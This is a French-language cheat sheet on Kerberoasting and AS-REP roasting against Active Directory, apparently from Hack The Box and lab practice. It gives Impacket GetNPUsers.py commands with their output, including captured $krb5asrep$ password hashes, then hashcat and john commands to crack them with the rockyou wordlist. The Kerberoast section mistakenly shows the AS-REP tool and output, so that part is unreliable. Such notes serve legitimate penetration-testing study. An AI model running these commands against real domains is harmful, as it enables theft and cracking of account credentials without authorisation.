# kerberoast et ASREProast (attaques Kerberos)

## Tools

* Impacket (linux)

* Rubeus (windows)


## Kerberoast

Kerberoast est similaire à l'AS_REP, il consiste à exploiter les tickets Kerberos des comptes de services accessible à partir d'un compte utilisateur

```sh
/usr/share/doc/python3-impacket/examples/GetNPUsers.py -request HTB.local/svc-alfresco:s3rvice -dc-ip 10.10.10.161
```
```txt
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2019-10-16 16:33:13.197703  2019-10-16 16:31:50.994383  0x410200 

$krb5asrep$23$svc-alfresco@HTB.LOCAL:b56acf6c68e5a4cecbee05233e672ad1$c883d417090944cd8261b42e3c69e1818ea72d2fbfd6195a2d3e22aaaa6d69dca0e16d5899bfc66ac868a2b3d2bb69d9f500b711ce74ccf671eb688fb8da20fec9a9183cd776ead51cddfb7b30cd713a498144f86c8072db7799d907f35008aeb007bce2a0e299354860f9e0ef18c8d3e5b31ff1668b8cb55f8614fa8a35ad56faeac5f1503cb079e3db6e8337aaa401fddb6361c156e8d34bb828eb4ebedb52878b94dceedb74a4fdd3ecd313d6868430bab82ad75124a9fd022c7ecc123ca33ef4a58f647c01d7f48aef89b8aaa33d6f29d9d151a386a3a9f3b0f0829a657954fdce800cb1
```

### Syntaxe

```sh
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```


## AS_REP

Similaire à Kerberoast, mais cible les comptes qui n’ont pas la pré-authentification Kerberos activée. Il n'y a donc pas besoin d'avoir de compte utilisateur.

* check ASREPRoast for a list of users (no credentials required)

```sh
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```

exemple:

```sh
/usr/share/doc/python3-impacket/examples/GetNPUsers.py HTB.local/ -usersfile ./list.txt -dc-ip 10.10.10.161
```
```txt
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$svc-alfresco@HTB.LOCAL:0f8b748c0c7d0a6ff02fa17a749ba128$ccacb6c97be0a844b6890b88bc97cd27b6798396bf2c3e64c773f25f257c000c6f2cc4301b2d97c24a4a752bbbbe1754a4238585dcac082206e021439994f2d7e46dfb24a7189417de710ad4f495aa1b19ee9e443d58aa275f95e3e9df419551fa4ba2b77dd260edae5112d49a4e6bb5f99597adc891d12ff54c1be1cef600eaee164a2a674093fc0bd02540b40f96d44a6e44f4cf4d66c9c8a3cd883994e599c55aaa91264f3acd2fd257943aaacf2462cc68d274940cc7530829b9b23c6e144a5915514d6e55a02752199aa9df813f1104798188d8788122acf982b85a4c6995a3b272956b
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

## Cracking with dictionary of passwords:

```sh
hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>

john --wordlist=<passwords_file> <AS_REP_responses_file>
```


## exemple d'attaque ASREProast après lancement du script BadBloud sur un AD de test

```sh
GetNPUsers.py VULN.LAN/SABRINA_SCHMIDT -request -format john -outputfile hashes.asreproast -dc-ip 192.168.206.135 -no-pass
```
```txt
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for SABRINA_SCHMIDT
$krb5asrep$SABRINA_SCHMIDT@VULN.LAN:ff86ad3cbde239bd2728b00c0c7c5db4$14da2a1cfe4cf47a58c36e655b84d593e29cc7f8d2add72dc473a046b52a0cb128c448a50768be2cbef8c155f1fc79e5104592849fb21a1ecbf1d9448c25c31ab9b22894306afd2baee25c3263421667d77e0d531329e32ef3e7945ba220863c706d1f1dc087a3024f9c8581461a3da5b1b4c331efbe12c6c15fab4d3ff2053b4a3e74316517a08472c7f07891759a191735ebe6bbcb11d2b19a7bfb0b0854e9735bed0b6a6c43cfcc33e514f390b51dfd0c7b23adf03edbc9cb8e93e0ce5f347ba7fc3c304fb401327b7319dbe77773b633b4180adc8ac8edcf9c610cb9931fad2d1d98
```

### john

```sh
wget https://cdn.hashmob.net/wordlists/rockyou.txt
john --wordlist=rockyou.txt hash.txt --rules=jumbo
```
